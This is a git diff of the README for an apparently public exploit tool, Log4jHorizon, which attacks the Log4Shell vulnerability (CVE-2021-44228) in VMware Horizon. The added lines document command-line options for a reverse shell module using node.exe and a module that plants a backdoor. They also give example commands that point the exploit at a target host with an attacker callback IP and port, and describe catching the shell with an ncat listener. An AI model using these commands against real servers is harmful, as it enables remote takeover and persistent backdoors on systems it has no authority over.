@@ -1,4 +1,5 @@
 # Log4jHorizon
+
 Exploiting CVE-2021-44228 in VMWare Horizon for remote code execution and more.
 
 * BLOG COMING SOON
@@ -43,20 +44,27 @@ git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jHorizon \
     && cd Log4jHorizon && docker build -t Log4jHorizon .
 ```
 
-To run the container, run a command similar to the following with your command line flags appended. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:
+To run the container, run a command similar to the following with your command line flags appended. Note that the container will not catch a reverse shell. You need to create a ncat listener in a separate shell session:
 
 ```
+docker run -it -p 1389:1389 Log4jHorizon \
+    -r -t horizon.acme.com -i 192.168.1.1 -p 4444
 ```
 
 
 # Usage
 
 ```
-usage: exploit.py [-h] -u URL -i CALLBACK -p PORT
+usage: exploit.py [-h] -t URL -i CALLBACK [-p PORT] [-r] [-b]
 
-arguments:
+optional arguments:
   -h, --help            show this help message and exit
-  -u URL, --url URL     VMWare Horizon base URL
+  -t URL, --target URL  VMWare Horizon IP
+  -i CALLBACK, --ip CALLBACK
+                        Callback IP for payload delivery and reverse shell.
+  -p PORT, --port PORT  Callback port for reverse shell.
+  -r, --revshell        Module to establish reverse shell using node.exe.
+  -b, --backdoor        Module to add backdoor.
 ```
 
 # Examples
@@ -64,7 +72,7 @@ arguments:
 Get a reverse shell using the tool installed on your local system:
 
 ```
-python3 exploit.py -u https://horizon.acme.com 
+python3 exploit.py -r -t horizon.acme.com -p 442 -i 192.168.1.1
 ```
 
 # Disclaimer
